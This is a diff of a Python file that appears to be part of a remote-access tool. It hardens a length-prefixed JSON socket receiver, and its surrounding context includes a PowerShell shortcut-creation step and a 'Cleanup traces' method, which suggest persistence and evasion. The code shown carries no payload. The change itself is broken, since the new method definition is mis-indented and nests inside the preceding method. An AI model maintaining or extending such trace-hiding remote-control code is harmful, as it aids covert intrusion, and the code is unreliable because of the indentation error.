@@ -586,15 +586,19 @@ $Shortcut.Save()
         except Exception as e:
             print(f"[!] Send error: {e}")
     
-    def receive_data(self, sock, timeout=5):
+        def receive_data(self, sock, timeout=5):
         """Receive JSON data from socket"""
         try:
             sock.settimeout(timeout)
             
-            # Receive length
-            raw_len = sock.recv(4)
-            if not raw_len:
-                return None
+            # Receive length (4 bytes)
+            raw_len = b''
+            while len(raw_len) < 4:
+                chunk = sock.recv(4 - len(raw_len))
+                if not chunk:
+                    return None
+                raw_len += chunk
+            
             msg_len = struct.unpack('>I', raw_len)[0]
             
             # Receive data
@@ -609,13 +613,17 @@ $Shortcut.Save()
             
             if bytes_received == msg_len:
                 data = b''.join(chunks)
-                # Skip any padding
-                return json.loads(data.decode('utf-8', errors='ignore'))
+                try:
+                    return json.loads(data.decode('utf-8'))
+                except json.JSONDecodeError:
+                    # Try to handle malformed JSON
+                    return {'type': 'error', 'data': 'Invalid JSON received'}
             
         except socket.timeout:
             return None
         except Exception as e:
             return None
+
     
     def cleanup(self):
         """Cleanup traces"""
